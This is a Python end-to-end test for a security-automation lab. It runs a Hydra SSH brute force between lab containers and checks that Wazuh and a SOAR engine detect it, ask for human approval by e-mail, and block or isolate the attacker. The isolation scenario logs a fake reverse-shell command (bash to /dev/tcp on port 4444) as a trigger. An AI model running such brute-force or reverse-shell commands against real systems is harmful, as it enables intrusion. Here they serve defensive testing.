#!/usr/bin/env python3
"""End-to-end test: live Hydra SSH brute force -> Wazuh -> SOAR -> HITL e-mail -> firewall block.

Usage:  python3 scripts/e2e_test.py [--reuse] [--skip-isolation] [--keep]

Steps
  1. (Re)deploy the full lab with docker compose (fresh volumes unless --reuse).
  2. Wait for the SOAR engine, the Wazuh API and the target-victim agent to be active.
  3. Verify the attacker can reach target-victim:22, then launch hydra from attacker-sim.
  4. Wait for the SOAR incident (awaiting_approval) and assert ingest->HITL < 2s.
  5. Read the HITL approval e-mail from Mailpit and click the signed "Approve" link.
  6. Wait for containment and verify the attacker is blocked while other hosts are not.
  7. (Optional) Simulate a host compromise and verify Docker network isolation.
  8. Verify the hash-chained audit trail and print the incident timeline.
Only the Python standard library is used.
"""

from __future__ import annotations

import argparse
import json
import re
import secrets
import subprocess
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path
from typing import Any

ROOT = Path(__file__).resolve().parent.parent
SOAR = "http://localhost:8000"
MAILPIT = "http://localhost:8025"
ATTACKER_IP = "172.28.0.66"
VICTIM = "target-victim"
NETWORK = "soar-lab"
HITL_BUDGET_MS = 2000.0

GREEN, RED, BOLD, RESET = "\033[32m", "\033[31m", "\033[1m", "\033[0m"
results: list[tuple[str, bool, str]] = []


def step(msg: str) -> None:
    print(f"\n{BOLD}==> {msg}{RESET}", flush=True)


def check(name: str, ok: bool, detail: str = "") -> bool:
    results.append((name, ok, detail))
    mark = f"{GREEN}PASS{RESET}" if ok else f"{RED}FAIL{RESET}"
    print(f"  [{mark}] {name}{' - ' + detail if detail else ''}", flush=True)
    return ok


def sh(*args: str, check_rc: bool = True, timeout: int = 900) -> subprocess.CompletedProcess[str]:
    proc = subprocess.run(args, cwd=ROOT, text=True, capture_output=True, timeout=timeout)
    if check_rc and proc.returncode != 0:
        raise RuntimeError(f"{' '.join(args)} failed:\n{proc.stdout}\n{proc.stderr}")
    return proc


def compose(*args: str, **kw: Any) -> subprocess.CompletedProcess[str]:
    return sh("docker", "compose", *args, **kw)


def load_env() -> dict[str, str]:
    env_file = ROOT / ".env"
    if not env_file.exists():
        print("  generating .env with random secrets")
        lines = []
        for line in (ROOT / ".env.example").read_text().splitlines():
            key = line.split("=", 1)[0]
            if key in {"SOAR_API_TOKEN", "SOAR_ADMIN_TOKEN", "SOAR_HITL_SIGNING_KEY",
                       "POSTGRES_PASSWORD"}:
                line = f"{key}={secrets.token_urlsafe(32)}"
            lines.append(line)
        env_file.write_text("\n".join(lines) + "\n")
    env = {}
    for line in env_file.read_text().splitlines():
        if "=" in line and not line.lstrip().startswith("#"):
            key, value = line.split("=", 1)
            env[key.strip()] = value.strip()
    return env


def http(method: str, url: str, headers: dict[str, str] | None = None,
         body: Any = None) -> tuple[int, Any]:
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method,
                                 headers={"Content-Type": "application/json",
                                          "Accept": "application/json", **(headers or {})})
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:  # noqa: S310
            raw = resp.read().decode()
            status = resp.status
    except urllib.error.HTTPError as exc:
        raw, status = exc.read().decode(), exc.code
    try:
        return status, json.loads(raw)
    except json.JSONDecodeError:
        return status, raw


def wait_for(desc: str, fn: Any, timeout: float, interval: float = 2.0) -> Any:
    deadline = time.time() + timeout
    last: Any = None
    while time.time() < deadline:
        try:
            last = fn()
            if last:
                return last
        except (urllib.error.URLError, OSError, RuntimeError) as exc:
            last = exc
        time.sleep(interval)
    raise TimeoutError(f"timed out after {timeout}s waiting for {desc} (last={last!r})")


def ssh_reachable(service: str) -> bool:
    if service == "attacker-sim":
        proc = compose("exec", "-T", "attacker-sim", "nc", "-z", "-w", "3", VICTIM, "22",
                       check_rc=False, timeout=30)
    else:
        proc = compose("exec", "-T", service, "python", "-c",
                       f"import socket; socket.create_connection(('{VICTIM}', 22), 3)",
                       check_rc=False, timeout=30)
    return proc.returncode == 0


def find_approve_link(incident_id: str) -> str | None:
    status, found = http("GET", f"{MAILPIT}/api/v1/search?query={incident_id}")
    if status != 200 or not found.get("messages"):
        return None
    msg_id = found["messages"][0]["ID"]
    _, message = http("GET", f"{MAILPIT}/api/v1/message/{msg_id}")
    match = re.search(r"Approve Mitigation: (\S+)", message.get("Text", ""))
    return match.group(1) if match else None


def main() -> int:  # noqa: PLR0915
    parser = argparse.ArgumentParser(description=__doc__,
                                     formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--reuse", action="store_true",
                        help="reuse the running lab instead of a fresh deployment")
    parser.add_argument("--skip-isolation", action="store_true",
                        help="skip the container-isolation scenario")
    parser.add_argument("--keep", action="store_true", help="leave the lab running (default)")
    parser.add_argument("--down", action="store_true", help="tear the lab down afterwards")
    args = parser.parse_args()

    env = load_env()
    admin = {"X-Admin-Token": env["SOAR_ADMIN_TOKEN"]}

    step("Deploying lab (docker compose)")
    if not args.reuse:
        compose("down", "-v", "--remove-orphans", check_rc=False)
    compose("up", "-d", "--build", timeout=1800)
    print("  containers started")

    step("Waiting for SOAR engine, Wazuh API and agent enrollment")
    wait_for("SOAR readiness", lambda: http("GET", f"{SOAR}/health/ready")[0] == 200, 180)

    def agent_active() -> dict[str, Any] | None:
        _, deps = http("GET", f"{SOAR}/api/v1/system/dependencies", admin)
        agents = deps.get("wazuh", {}).get("agents", []) if isinstance(deps, dict) else []
        return next((a for a in agents
                     if a.get("name") == VICTIM and a.get("status") == "active"), None)

    agent = wait_for("target-victim agent to be active", agent_active, 300, 5)
    check("Wazuh agent enrolled and active", True, f"agent {agent['id']} ({agent.get('ip')})")
    time.sleep(10)  # let logcollector settle on auth.log

    step("Pre-attack reachability")
    if not check("attacker-sim can reach target-victim:22", ssh_reachable("attacker-sim")):
        return summary()

    step("Launching Hydra SSH brute force from attacker-sim")
    started = time.time()
    hydra = compose("exec", "-T", "attacker-sim", "timeout", "120", "hydra", "-I", "-t", "4",
                    "-L", "/wordlists/users.txt", "-P", "/wordlists/passwords.txt",
                    f"ssh://{VICTIM}", check_rc=False, timeout=180)
    tail = [ln for ln in hydra.stdout.splitlines() if ln.strip()][-2:]
    print("  hydra: " + " | ".join(tail))

    step("Waiting for SOAR incident (playbook trigger + HITL dispatch)")

    def awaiting() -> dict[str, Any] | None:
        _, items = http("GET", f"{SOAR}/api/v1/incidents?source_ip={ATTACKER_IP}", admin)
        return next((i for i in items if i["playbook_id"] == "ssh-bruteforce-containment"
                     and i["hitl_sent_at"]), None) if isinstance(items, list) else None

    incident = wait_for("brute-force incident", awaiting, 180, 2)
    incident_id = incident["id"]
    check("ssh-bruteforce-containment incident created", True,
          f"{incident_id} status={incident['status']} correlated={incident['correlated_events']}"
          f" detected {time.time() - started:.1f}s after attack start")
    check("incident awaiting HITL approval", incident["status"] == "awaiting_approval")
    _, timeline = http("GET", f"{SOAR}/api/v1/incidents/{incident_id}/timeline", admin)
    latency = timeline["ingest_to_hitl_ms"]
    check(f"ingest -> HITL dispatch < {HITL_BUDGET_MS:.0f} ms", latency < HITL_BUDGET_MS,
          f"{latency:.1f} ms")
    check("attacker still reachable before approval", ssh_reachable("attacker-sim"))

    step("Admin approves via the signed link in the HITL e-mail (Mailpit)")
    link = wait_for("approval e-mail", lambda: find_approve_link(incident_id), 30, 1)
    print(f"  approve link: {link.split('?')[0]}?exp=...&sig=...")
    status, decision = http("GET", link)
    check("approve link accepted", status == 200, str(decision))

    def finished() -> dict[str, Any] | None:
        _, inc = http("GET", f"{SOAR}/api/v1/incidents/{incident_id}", admin)
        return inc if inc.get("status") in {"contained", "failed"} else None

    detail = wait_for("containment", finished, 120, 1)
    check("incident contained", detail["status"] == "contained",
          f"status={detail['status']} reason={detail.get('status_reason')}")
    for ex in detail["executions"]:
        print(f"    action={ex['action_name']} responder={ex['responder']} "
              f"status={ex['status']} code={ex['status_code']} attempts={ex['attempts']}")

    step("Verifying containment on the endpoint")
    rules = ""
    for _ in range(10):
        rules = compose("exec", "-T", VICTIM, "iptables", "-S", "INPUT", check_rc=False).stdout
        if ATTACKER_IP in rules:
            break
        time.sleep(1)
    check("DROP rule for attacker present on target-victim",
          f"-s {ATTACKER_IP}/32 -j DROP" in rules,
          next((ln for ln in rules.splitlines() if ATTACKER_IP in ln), "missing"))
    check("attacker-sim can NO LONGER reach target-victim:22", not ssh_reachable("attacker-sim"))
    check("legitimate host (soar-engine) can still reach target-victim:22",
          ssh_reachable("soar-engine"))

    if not args.skip_isolation:
        step("Scenario 2: simulated host compromise -> Docker network isolation")
        compose("exec", "-T", VICTIM, "logger", "-p", "auth.crit",
                "SOAR-SIM reverse shell spawned: bash -i >& /dev/tcp/203.0.113.9/4444")

        def isolation_incident() -> dict[str, Any] | None:
            _, items = http("GET", f"{SOAR}/api/v1/incidents", admin)
            return next((i for i in items if i["playbook_id"] == "container-isolation"
                         and i["hitl_sent_at"]), None) if isinstance(items, list) else None

        iso = wait_for("container-isolation incident", isolation_incident, 90, 2)
        check("container-isolation incident created", True,
              f"{iso['id']} severity={iso['severity']}")
        status, _ = http("GET", f"{SOAR}/api/v1/actions/approve/{iso['id']}", admin)
        check("approved via admin API", status == 200)
        iso_id = iso["id"]

        def iso_done() -> dict[str, Any] | None:
            _, inc = http("GET", f"{SOAR}/api/v1/incidents/{iso_id}", admin)
            return inc if inc.get("status") in {"contained", "failed"} else None

        iso_detail = wait_for("isolation", iso_done, 60, 1)
        check("container isolated", iso_detail["status"] == "contained",
              json.dumps(iso_detail["executions"][-1]["response"]) if
              iso_detail["executions"] else "")
        nets = sh("docker", "inspect", "-f", "{{json .NetworkSettings.Networks}}", VICTIM).stdout
        check("target-victim has no network attachments", json.loads(nets) == {}, nets.strip())
        sh("docker", "network", "connect", "--ip", "172.28.0.30", NETWORK, VICTIM,
           check_rc=False)
        print("  (target-victim reconnected to the lab network)")

    step("Audit trail")
    _, verify = http("GET", f"{SOAR}/api/v1/audit/verify", admin)
    check("hash-chained audit log verifies", verify.get("valid") is True,
          f"{verify.get('entries_checked')} entries, head={str(verify.get('head_hash'))[:16]}")
    _, timeline = http("GET", f"{SOAR}/api/v1/incidents/{incident_id}/timeline", admin)
    print(f"\n  Timeline for {incident_id}:")
    for event in timeline["events"]:
        elapsed = event["elapsed_ms"]
        print(f"    {event['stage']:<34} {event['timestamp'] or '-':<34} "
              f"{'+' + format(elapsed, '.1f') + ' ms' if elapsed is not None else ''}")
    (ROOT / "e2e-report.json").write_text(json.dumps(
        {"incident": detail, "timeline": timeline, "audit": verify,
         "checks": [{"name": n, "ok": o, "detail": d} for n, o, d in results]},
        indent=2, default=str))

    if args.down:
        compose("down", "-v")
    return summary()


def summary() -> int:
    failed = [r for r in results if not r[1]]
    print(f"\n{BOLD}{len(results) - len(failed)}/{len(results)} checks passed{RESET}")
    if failed:
        print(f"{RED}FAILED:{RESET} " + "; ".join(n for n, _, _ in failed))
    return 1 if failed else 0


if __name__ == "__main__":
    sys.exit(main())
